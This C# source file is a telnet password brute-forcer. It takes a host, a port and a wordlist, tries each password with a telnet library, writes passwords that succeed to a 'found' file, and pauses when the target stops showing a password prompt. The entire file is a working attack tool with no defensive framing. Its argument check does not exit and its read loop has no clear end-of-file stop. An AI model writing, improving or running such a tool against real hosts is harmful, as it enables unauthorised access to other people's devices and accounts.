using System;
using System.IO;
using MinimalisticTelnet;

namespace telnetbrute
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			if (args.Length < 3) {
				showUsage ();
			}

			string passwordpath = args[2];
			string host = args [0];
			int port = int.Parse(args [1]);
			StreamWriter writer = new StreamWriter ("passwords.found.txt");
			bool shouldRead = true;
			string password = null;

			using (StreamReader reader = new StreamReader (passwordpath)) {
				while (reader.BaseStream.CanRead) {
					if (shouldRead) {
						password = reader.ReadLine ();
					}

					try {
						shouldRead = true;
						TelnetConnection tc = new TelnetConnection(host,port);
						Console.WriteLine("Try:" + password);
						tc.Login(null,password,150);

						if(tc.IsConnected){
							writer.WriteLine(password);
							writer.WriteLine("****DING DING " + password);
						}
					
					} catch (Exception e) {
						shouldRead = false;
						Console.WriteLine (e.Message);
						if (e.Message == "Failed to connect : no password prompt") {
							System.Threading.Thread.Sleep (15000);
						}
					}

				}
				reader.Close ();
			}
			writer.Close ();
		}

		private static void showUsage(){
			Console.WriteLine ("telnetbrute host port passwordpath");
		}
	}
}
